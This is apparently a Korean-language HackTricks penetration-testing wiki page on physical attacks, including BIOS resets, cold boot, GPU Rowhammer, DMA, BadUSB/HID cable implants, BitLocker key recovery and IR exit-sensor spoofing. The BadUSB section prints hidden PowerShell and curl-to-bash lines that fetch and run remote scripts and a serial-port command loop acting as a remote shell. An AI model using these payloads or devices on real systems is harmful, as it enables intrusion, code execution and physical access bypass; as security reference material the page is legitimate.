# 물리적 공격

{{#include ../banners/hacktricks-training.md}}

보드 수준의 인터페이스 탐색, 시리얼 콘솔, 플래시 접근, 사이드 채널 및 글리칭은 [Hardware Hacking](hardware-hacking/README.md)과 해당 인터페이스별 장을 참고하세요. 이 페이지에서는 시스템 전체에 물리적으로 접근해야 하는 공격을 다룹니다.

## BIOS 암호 복구 및 시스템 보안

레거시 PC 펌웨어 설정은 CMOS 배터리를 분리하거나 문서화된 Clear CMOS 점퍼를 사용해 초기화할 수 있습니다. 필요한 전원 차단 시간은 보드마다 다르며, 최신 UEFI 암호나 키는 비휘발성 플래시, 임베디드 컨트롤러 또는 보안 장치에 저장될 수 있으므로 배터리를 분리해도 유지될 수 있습니다. 핀을 단락하기 전에 보드/서비스 설명서를 확인하세요. 이 절차로 TPM 측정값이 무효화되고 디스크 암호화 복구가 시작될 수도 있습니다.

레거시 x86 시스템에서는 **killCMOS**, **CmosPwd** 같은 도구를 부팅 가능한 환경에서 사용해 CMOS에 저장된 설정을 확인하거나 변경할 수 있습니다. CmosPwd는 문서화된 일부 구형 BIOS 제품군의 암호 형식을 인식하며 CMOS 상태를 백업, 복원 또는 삭제/초기화할 수 있습니다. 공개된 빌드는 레거시 DOS/Windows, Linux, FreeBSD 및 NetBSD 환경을 대상으로 합니다.<sup>[[18]](#references)</sup> 이러한 유틸리티는 범용 UEFI 암호 제거 도구가 아니며 충분한 하드웨어/펌웨어 접근 권한이 필요합니다.

일부 노트북 펌웨어는 암호를 여러 번 잘못 입력하면 공급업체별 챌린지 코드를 표시합니다. [bios-pw.org](https://bios-pw.org) 같은 데이터베이스는 일부 모델에서 레거시 공급업체 복구 암호를 생성할 수 있지만, 많은 시스템은 복구 가능한 챌린지 없이 잠금 기능을 구현합니다. 생성된 암호는 모델별로 다르므로 영구 시도 횟수를 소진하지 않도록 주의하세요.

### UEFI 보안

최신 **UEFI** 시스템에서는 CHIPSEC을 사용해 Secure Boot 변수 보호를 감사할 수 있습니다. 먼저 아래의 비수정 검사를 실행하세요. 선택 사항인 `-a modify` 모드는 변수를 의도적으로 손상시키려 하므로 복구 가능한 실험실 시스템에서만 사용해야 합니다. CHIPSEC 자체도 권한이 높은 드라이버와 저수준 하드웨어 접근은 프로덕션 엔드포인트에 적합하지 않다고 경고합니다.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM 분석 및 콜드 부트 공격

DRAM은 refresh가 중단되자마자 모든 비트를 잃지는 않습니다. 데이터 감쇠 속도는 모듈 기술과 온도에 따라 크게 달라지며, 냉각하면 냉각하지 않은 상태에서 전원을 껐다 켜는 것보다 훨씬 오래 유용한 데이터를 보존할 수 있습니다. cold-boot attack은 빠르게 재부팅해 소규모 acquisition 환경으로 진입하거나 냉각된 모듈을 옮긴 뒤, raw memory를 캡처하고 비트 감쇠에도 불구하고 암호화 키를 재구성합니다. 디스크 복사 유틸리티가 자동으로 물리 메모리 이미저가 되는 것은 아니며, Volatility는 캡처를 분석할 뿐 획득하지 않습니다. 플랫폼에 적합하고 검증된 acquisition 도구를 사용하세요.<sup>[[12]](#references)</sup>

---

## 페이지 테이블을 대상으로 한 GPU Rowhammer

최신 GPU Rowhammer 공격은 일반 버퍼 대신 **GPU 가상 메모리 메타데이터**를 대상으로 하면 훨씬 더 유용해집니다. **GDDR6 NVIDIA Ampere GPU**를 대상으로 한 최근 연구에서는 권한이 없는 CUDA 코드를 실행하는 공격자가 GPU별 hammering 패턴을 만들고, **memory massaging**을 사용해 페이징 구조를 취약한 행에 배치한 다음, **마지막 수준 페이지 테이블** 또는 중간 **페이지 디렉터리**의 비트를 뒤집을 수 있음을 보여줍니다. 단 하나의 주소 변환 항목이 손상되면 공격자는 **임의의 GPU 메모리 읽기/쓰기** 기능을 확보한 뒤 호스트 침해로 전환할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 공격 패턴

1. GDDR6에서 **hammering 가능한 행을 프로파일링**하고, DRAM 내 완화 기법을 우회하는 refresh 인식 및 비균일 hammering 패턴을 구축합니다.
2. 드라이버가 페이지 변환 구조를 기본 보호 풀에 두지 않고 hammering 가능한 물리적 위치에 배치하도록 **GPU 할당을 조정합니다**. 실제로는 저메모리 페이지 테이블 영역을 소진하고, 제어된 stride를 사용해 대규모 sparse UVM 매핑을 뿌리는 방법이 있습니다.
3. 페이지 테이블 또는 페이지 디렉터리 항목 내의 **PFN**이나 aperture 관련 비트 같은 **주소 변환 메타데이터를 뒤집어**, 공격자가 제어하는 가상 페이지가 페이지 테이블 페이지, 임의의 GPU 메모리 또는 호스트에서 볼 수 있는 시스템 매핑으로 해석되게 합니다.
4. 위조된 매핑을 재사용해 추가 주소 변환 항목을 덮어쓰고, GPU 컨텍스트 전반에 걸친 **임의의 GPU 메모리 읽기/쓰기**로 권한을 높입니다.

### 호스트 전환 및 완화책

- **IOMMU가 비활성화된 경우**, 위조된 시스템 aperture 매핑으로 GPU가 임의의 **호스트 물리 메모리**에 접근할 수 있어 GPU primitive가 호스트 전체 침해로 이어집니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**는 마지막 수준 페이지 테이블 항목을 대상으로 하며, **GeForge**는 페이지 디렉터리 수준을 손상시키는 편이 더 쉬울 수 있음을 보여줍니다. 비트 하나를 뒤집어도 더 큰 주소 변환 하위 트리를 다른 대상으로 지정할 수 있기 때문입니다. 특정 페이징 계층 하나만 보안상 중요하다고 간주하지 마세요.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**는 GDDRHammer/GeForge가 사용하는 호스트 메모리 직접 접근 경로를 차단하므로 여전히 중요하지만, **완전한 완화책은 아닙니다**. **GPUBreach**는 공격자가 GPU에서 쓸 수 있는 드라이버 소유 CPU 버퍼를 손상시킨 뒤 NVIDIA 드라이버의 메모리 안전성 버그를 유발해 커널 쓰기 primitive와 **root shell**을 얻는 2단계 전환을 보여줍니다. 이 공격은 IOMMU가 활성화된 경우에도 가능합니다.<sup>[[3]](#references)</sup>
- 지원되는 워크스테이션/서버 GPU에서는 **시스템 수준 ECC**가 실용적인 보안 강화책입니다. ECC가 없는 소비자용 GPU는 방어 수단이 더 제한적입니다.<sup>[[4]](#references)</sup>
- 이러한 공격은 순전히 이론적인 것이 아닙니다. **GeForge**는 RTX 3060에서 **1,171**회, RTX A6000에서 **202**회의 비트 플립을 보고했으며, 이는 호스트 권한 상승 공격 체인을 구현하기에 충분했습니다.<sup>[[2]](#references)[[9]](#references)</sup>

---

## 직접 메모리 접근(DMA) 공격

사전 부팅 IOMMU 적용 수준을 낮추고 Windows DMA 공격 체인을 가능하게 하는 오프라인 UEFI IFR/NVRAM 패치에 대해서는 다음을 참고하세요.

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**은 FireWire 및 초기 Thunderbolt 구성 같은 인터페이스를 통한 **DMA 기반 메모리 획득 및 패치**를 시연하며, 과거의 로그인 우회 시그니처도 포함합니다. 단순히 “Windows 10에서는 효과가 없다”고 할 수는 없습니다. 악용 가능성은 인터페이스, 대상 빌드, IOMMU 정책, 잠금 상태, 그리고 Windows Kernel DMA Protection의 지원 및 활성화 여부에 따라 달라집니다. Windows 10 버전 1803 이상에서는 호환 플랫폼에 Kernel DMA Protection이 도입되어 공격 표면이 크게 달라졌습니다.<sup>[[13]](#references)[[14]](#references)</sup>

---

## 시스템 접근을 위한 Live CD/USB

암호화되지 않았거나 이미 잠금 해제된 Windows 볼륨에서는 오프라인 환경에서 **sethc.exe** 또는 **Utilman.exe** 같은 접근성 바이너리를 **cmd.exe**로 바꿀 수 있습니다. 그러면 해당 로그온 화면 바로 가기를 실행할 때 SYSTEM 명령 프롬프트가 열립니다. **chntpw** 같은 도구로 로컬 SAM 계정 데이터를 편집할 수도 있습니다. 이 방법은 잠긴 BitLocker 볼륨을 우회하지 못하며, DPAPI/EFS로 보호된 자격 증명을 손상시킬 수 있습니다. 포렌식 사본과 백업을 보존하세요.

**Kon-Boot**는 지원되는 Windows/macOS 구성에서 부팅 시 인증을 우회하는 상용 도구입니다. 호환 여부는 OS, 펌웨어 모드, Secure Boot 및 디스크 암호화 구성에 따라 달라집니다. BitLocker로 잠긴 볼륨을 복호화하지는 않습니다.<sup>[[10]](#references)</sup>

---

## Windows 보안 기능 처리

### 부팅 및 복구 바로 가기

- **Delete/Supr**, F2, F10 또는 다른 제조업체 지정 키를 누르면 펌웨어 설정이 열릴 수 있습니다.
- **F8**은 해당 경로가 계속 활성화된 구성에서만 레거시 Windows 고급 부팅 옵션으로 진입합니다. 최신 시스템의 복구 진입 방법은 구성마다 다릅니다.
- 일부 구성에서는 **Shift** 키를 누르고 있으면 Windows 자동 로그온을 억제할 수 있지만, 정책/레지스트리 설정으로 이 동작을 비활성화할 수 있습니다.<sup>[[17]](#references)</sup>

### BAD USB 장치

**USB Rubber Ducky** 및 Teensy 보드 같은 장치는 신뢰된 HID 키보드로 인식되어 미리 정의된 키 입력을 주입할 수 있습니다. 페이로드는 처음에 로그인된 세션의 권한과 데스크톱 접근 권한으로 실행됩니다. UAC 프롬프트, 화면 잠금, 키보드 레이아웃, 타이밍 및 엔드포인트 USB 정책은 여전히 제약 요소입니다.<sup>[[15]](#references)</sup>

프로그래밍 가능한 주변 장치는 호스트 커널 파서를 공격하고, 여러 USB 장치를 조율해 heap grooming 및 정보 공개를 수행할 수도 있습니다.

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Windows UAS 대용량 저장 장치 파서 사례는 다음을 참고하세요.

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

관리자 또는 백업 권한이 있으면 shadow copy를 만들거나 레지스트리 hive를 저장해 **SAM** 및 **SYSTEM** 같은 잠긴 파일을 획득할 수 있습니다. 이는 침해 후 수행하는 수집 기법이지 권한 우회 방법이 아닙니다. `diskshadow`/VSS 및 레지스트리 hive 내보내기 이벤트와 대조해 확인해야 합니다.

## BadUSB / HID Implant 기법

### NFC 트리거 Android HID gadget

루팅된 Android 휴대전화는 USB 컨트롤러와 커널이 **USB gadget/HID 지원**을 제공할 때만 프로그래밍 가능한 USB 키보드가 될 수 있습니다. 호환 장치에서는 Kali NetHunter의 **USB Arsenal**을 통해 gadget 프로필을 사용할 수 있습니다. 다른 방법으로는 [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)이 있습니다. 이 도구는 ConfigFS gadget 기능을 만들며 `/dev/hidg0` 및 `/dev/hidg1` 같은 키보드/마우스 character device를 노출할 수 있습니다. 이 도구는 gadget endpoint만 만들 뿐, 별도의 프로세스가 여기에 HID report를 써야 합니다. 루트 접근 권한도 ConfigFS, HID gadget 지원 또는 사용 가능한 USB Device Controller가 없는 커널을 보완하지는 못합니다.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

이 endpoint를 Android NFC와 결합해 물리적 트리거로 사용할 수 있습니다. [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) 앱은 태그 UID를 읽고, 예상되는 형식으로 변환한 뒤 로컬 허용 목록을 확인합니다. 일치하면 설정된 Rubber Ducky 스타일 키보드 시퀀스를 전송합니다. 연결된 호스트에는 일반 키보드 입력으로 보이며 NFC 소프트웨어는 필요하지 않습니다.<sup>[[22]](#references)[[24]](#references)</sup>

바로 가기나 명령을 사용하기 전에 빈 텍스트 편집기에서 장치 인식과 키보드 레이아웃을 확인하세요. 무해한 페이로드는 다음과 같습니다.<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

중요한 신뢰 경계:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist는 인증이 아니라 식별입니다**. UID는 공개되어 있으며, 일부 토큰 유형이나 에뮬레이터는 복제 또는 사칭을 허용합니다. 허용된 UID를 복사하면 원래 토큰과 동일한 디스패치 경로를 따릅니다.
- **NfcScreenOff** Magisk 모듈은 NFC 서비스를 패치해 화면이 켜져 있고 잠금 해제된 것처럼 동작하게 합니다. 휴대폰이 이미 호스트에 연결되어 있다면, 누군가 휴대폰을 잠금 해제하지 않고도 payload를 실행할 수 있습니다.
- payload에 저장된 암호, API 토큰, 명령은 루팅되었거나 bootloader가 잠금 해제된 기기에서 복구할 수 있는 비밀 정보입니다. HID로 암호를 입력하는 것은 암호 없는 인증이 아니라 재사용 가능한 암호를 자동 입력하는 것입니다.
- HID injection은 활성 데스크톱의 권한으로 동작하며 포커스, 타이밍, 호스트의 키보드 레이아웃에 좌우됩니다. 민감한 작업을 실행하기 전에 최근 사용자 확인을 요구하고, 스크립트에 권한이 높은 비밀 정보를 넣지 말며, 실제 인증에는 암호화된 challenge-response authenticator를 사용하세요.

### Wi-Fi 관리형 케이블 임플란트

- **Evil Crow Cable Wind**와 같은 ESP32-S3 기반 임플란트는 USB-A→USB-C 또는 USB-C↔USB-C 케이블 안에 숨겨져 USB 키보드로만 열거되고, Wi-Fi를 통해 C2 stack을 노출합니다. 운영자는 피해자 호스트에서 케이블에 전원을 공급하고, `Evil Crow Cable Wind`라는 이름과 `123456789` 암호로 hotspot을 만든 다음 [http://cable-wind.local/](http://cable-wind.local/) (또는 DHCP 주소)로 접속해 내장 HTTP 인터페이스에 접근하면 됩니다.<sup>[[8]](#references)</sup>
- 브라우저 UI에는 *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, *Config* 탭이 있습니다. 저장된 payload에는 OS별 태그가 지정되고, 키보드 레이아웃은 즉시 전환되며, VID/PID 문자열을 변경해 알려진 주변기기를 흉내 낼 수 있습니다.
- C2가 케이블 안에 있으므로, 조직의 네트워크를 사용하지 않고도 휴대폰으로 payload를 준비하고 실행을 트리거하며 Wi-Fi 자격 증명을 관리할 수 있습니다. 이는 물리적 침입 후 체류 시간을 짧게 유지할 때 유용합니다.

### OS 인식 AutoExec payload

- AutoExec 규칙은 하나 이상의 payload를 USB 열거 직후 실행하도록 설정합니다. 임플란트는 가벼운 OS fingerprinting을 수행한 뒤 일치하는 스크립트를 선택합니다.
- 예시 workflow:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) 또는 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 실행이 자동으로 이루어지므로, 충전 케이블만 바꿔 꽂아도 로그인한 사용자 권한으로 “plug-and-pwn” 초기 접근을 얻을 수 있습니다.

### Wi-Fi TCP를 통한 HID 부트스트랩 remote shell

1. **Keystroke bootstrap:** 저장된 payload가 콘솔을 열고 새 USB serial device로 수신되는 내용을 실행하는 loop를 붙여넣습니다. 최소한의 Windows 변형은 다음과 같습니다:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **케이블 브리지:** 임플란트는 USB CDC 채널을 열린 상태로 유지하면서 ESP32-S3가 운영자에게 역방향으로 TCP 클라이언트(Python 스크립트, Android APK 또는 데스크톱 실행 파일)를 실행합니다. TCP 세션에 입력한 모든 바이트는 위의 serial 루프로 전달되어, air-gapped 호스트에서도 원격 명령 실행이 가능합니다. 출력은 제한적이므로 운영자는 일반적으로 블라인드 명령(계정 생성, 추가 도구 준비 등)을 실행합니다.

### HTTP OTA 업데이트 표면

- 문서화된 Evil Crow Cable Wind 인터페이스는 인증 없이 사용할 수 있는 `/update` 펌웨어 업데이트 엔드포인트를 제공합니다:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- 현장 담당자는 케이블을 열지 않고도 교전 중 기능을 핫스왑할 수 있습니다(예: USB Army Knife 펌웨어 플래시). 이를 통해 implant는 대상 호스트에 계속 연결된 상태로 새로운 기능으로 전환할 수 있습니다.

## BitLocker 암호화 우회

라이브 상태이거나 최근까지 실행 중이던 시스템을 승인된 포렌식 방식으로 획득하면, 볼륨이 잠금 해제된 동안 BitLocker 볼륨 마스터 키 또는 관련 키 자료가 포함되어 있을 수 있습니다. Elcomsoft Forensic Disk Decryptor 및 Passware Kit Forensic 같은 상용 도구는 지원되는 메모리 이미지, 최대 절전 모드 파일 또는 크래시 덤프에서 해당 자료를 검색할 수 있지만, 성공이 보장되지는 않습니다. 최신 Windows는 BitLocker가 활성화된 경우 크래시 덤프도 암호화하며, 저장된 48자리 복구 암호는 메모리에 있는 볼륨 키와는 다른 아티팩트입니다.<sup>[[12]](#references)[[16]](#references)</sup>

---

## 복구 키 추가를 위한 Social Engineering

공격자는 관리자를 설득해 BitLocker 관리 명령을 실행하게 한 뒤, 복구 암호, 외부 키 또는 다른 보호기를 추가하고 이를 확보할 수 있습니다. 복구 암호는 임의의 0 문자열로 설정할 수 없습니다. BitLocker 숫자 복구 암호는 검증된 48자리 형식이어야 합니다. 관련된 승인된 관리 명령 구문은 `manage-bde -protectors -add C: -recoverypassword`이며, 추가된 보호기는 `manage-bde -protectors -get C:`로 확인합니다. 보호기 추가를 모니터링하고, 새 복구 자료가 승인된 위치에만 에스크로되도록 하세요.<sup>[[16]](#references)</sup>

---

## 섀시 침입 / 유지보수 스위치를 악용한 BIOS 공장 초기화

최신 노트북과 소형 데스크톱에는 Embedded Controller(EC)와 BIOS/UEFI 펌웨어가 모니터링하는 **섀시 침입 스위치**가 장착된 경우가 많습니다. 스위치의 주된 목적은 장치를 열었을 때 경고를 표시하는 것이지만, 제조업체에 따라 스위치를 특정 패턴으로 전환할 때 작동하는 **문서화되지 않은 복구 단축키**를 구현하기도 합니다.<sup>[[5]](#references)[[6]](#references)</sup>

### 공격 방식

1. 스위치는 EC의 **GPIO 인터럽트**에 연결되어 있습니다.
2. EC에서 실행되는 펌웨어는 **누른 횟수와 타이밍**을 추적합니다.
3. 하드코딩된 패턴이 인식되면 EC는 시스템 NVRAM/CMOS의 **내용을 지우는** *mainboard-reset* 루틴을 호출합니다.
4. 다음 부팅 시 영향을 받는 모델은 초기화된 펌웨어 상태를 불러옵니다. 제조업체와 리비전에 따라 삭제되는 상태에는 supervisor password, 사용자 지정 부팅 설정 또는 등록된 Secure Boot 키가 포함될 수 있습니다. TPM 상태와 디스크 암호화에 미치는 영향은 별도로 평가해야 합니다.

> 펌웨어를 초기화하면 외부 부팅 옵션이 복원될 수 있지만, 저장 장치가 **복호화되지는 않습니다**. TPM/펌웨어 변경 후 BitLocker 또는 다른 전체 디스크 암호화 시스템이 복구 모드로 전환될 수 있으며, 복구 키가 없으면 내부 드라이브는 계속 보호됩니다.<sup>[[16]](#references)</sup>

### 실제 사례 – Framework 13 노트북

Framework 13(11세대/12세대/13세대)의 복구 단축키는 다음과 같습니다.

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

10번째 사이클 이후 EC는 다음 재부팅 시 BIOS가 NVRAM을 지우도록 지시하는 플래그를 설정합니다. 전체 절차는 약 40초가 걸리며 **드라이버만 있으면 됩니다**.<sup>[[5]](#references)</sup>

### 일반적인 Exploitation 절차

1. EC가 실행 중이 되도록 대상 장치의 전원을 켜거나 절전 모드에서 복귀시킵니다.
2. 하단 덮개를 분리해 침입/유지보수 스위치에 접근합니다.
3. 제조사별 토글 패턴을 재현합니다(문서나 포럼을 확인하거나 EC 펌웨어를 리버스 엔지니어링합니다).
4. 장치를 다시 조립하고 재부팅한 뒤, 실제로 변경된 펌웨어 설정과 자격 증명을 확인합니다.
5. 승인을 받았고 외부 부팅이 가능하다면, 통제된 라이브 이미지를 부팅합니다. 내부 볼륨이 정당한 절차로 잠금 해제되었거나 애초에 암호화되지 않은 경우, 라이브 환경에서 자격 증명과 데이터를 수집하거나 EFI System Partition을 검사할 수 있습니다. 해당 파티션을 수정해 EFI implant를 설치하는 것은 지속성이 있고 침해 수준이 높은 행위이며, Secure Boot, measured boot, 펌웨어 쓰기 방지 및 엔드포인트 모니터링의 제약을 받습니다. 암호화된 저장 장치는 키나 복구 자료 없이는 접근할 수 없습니다.

### 탐지 및 완화

* OS 관리 콘솔에 섀시 침입 이벤트를 기록하고 예상치 못한 BIOS 초기화와 연관 지어 분석합니다.
* 나사와 덮개에 **개봉 흔적이 남는 봉인**을 사용해 분리 여부를 탐지합니다.
* 장치를 **물리적으로 통제되는 구역**에 보관합니다. 물리적 접근은 완전한 침해와 같다고 가정합니다.
* 가능한 경우 제조사의 “유지보수 스위치 초기화” 기능을 비활성화하거나 NVRAM 초기화에 추가적인 암호화 인증을 요구합니다.

---

## 비접촉식 퇴실 센서를 겨냥한 은밀한 IR 주입

### 센서 특성
- 일반적인 “손 흔들기식 퇴실” 센서는 근적외선 LED 이미터와 TV 리모컨용과 유사한 수신기 모듈을 사용하며, 올바른 반송파(약 30 kHz)의 펄스 여러 개(약 4~10개)를 감지한 뒤에만 논리 high를 출력합니다.<sup>[[7]](#references)</sup>
- 플라스틱 차폐물이 이미터와 수신기가 서로를 직접 향하지 못하게 하므로, 컨트롤러는 검증된 반송파가 근처 표면에서 반사되어 들어왔다고 간주하고 도어 스트라이크를 여는 릴레이를 작동시킵니다.
- 컨트롤러가 대상이 감지되었다고 판단하면 송신 변조 포락선을 바꾸는 경우가 많지만, 수신기는 필터링된 반송파와 일치하는 모든 버스트를 계속 받아들입니다.

### 공격 절차
1. **방출 프로파일 캡처** – 로직 애널라이저를 컨트롤러 핀에 연결해 내부 IR LED를 구동하는 감지 전후의 파형을 모두 기록합니다.
2. **“감지 후” 파형만 재생** – 기본 이미터를 제거하거나 무시하고, 이미 트리거된 패턴으로 외부 IR LED를 처음부터 구동합니다. 수신기는 펄스 수와 주파수만 확인하므로 스푸핑된 반송파를 진짜 반사 신호로 처리하고 릴레이 라인을 활성화합니다.
3. **송신 제어** – 수신기의 AGC나 간섭 처리 로직을 포화시키지 않고 필요한 최소 펄스 수를 전달하도록, 조정된 버스트(예: 수십 밀리초 동안 켜고 비슷한 시간 동안 끄기)로 반송파를 송신합니다. 연속 방출은 센서의 감도를 빠르게 떨어뜨려 릴레이 작동을 막습니다.

### 장거리 반사 주입
- 작업대용 LED를 고출력 IR 다이오드, MOSFET 드라이버 및 집광 광학 장치로 교체하면 약 6 m 거리에서도 안정적으로 트리거할 수 있습니다.
- 공격자는 수신기 조리개를 직접 바라볼 필요가 없습니다. 유리를 통해 보이는 내부 벽, 선반 또는 문틀에 빔을 비추면 반사된 에너지가 약 30° 시야각으로 들어가 가까운 거리에서 손을 흔드는 것처럼 동작합니다.
- 수신기는 약한 반사광을 예상하므로, 훨씬 강한 외부 빔이 여러 표면에서 반사된 뒤에도 감지 임계값을 넘을 수 있습니다.

### 무기화된 공격용 손전등
- 드라이버를 상용 손전등 내부에 넣으면 도구를 눈에 띄지 않게 숨길 수 있습니다. 가시광 LED를 수신기 대역에 맞는 고출력 IR LED로 교체하고, ATtiny412(또는 유사한 MCU)를 추가해 약 30 kHz 버스트를 생성한 다음, MOSFET으로 LED 전류를 싱크합니다.
- 망원 줌 렌즈는 빔을 좁혀 사거리와 정밀도를 높이며, MCU로 제어되는 진동 모터는 가시광을 방출하지 않고 변조가 활성화되었음을 촉각으로 알려줍니다.
- 여러 저장된 변조 패턴(조금씩 다른 반송파 주파수와 포락선)을 순환하면 리브랜딩된 센서 제품군 전반에서 호환성이 높아집니다. 작업자는 릴레이가 딸깍 소리를 내고 문이 열릴 때까지 반사 표면을 차례로 비출 수 있습니다.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Turn a Rooted Android Phone into an NFC Authenticator and Automation Tool for Your PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)

{{#include ../banners/hacktricks-training.md}}
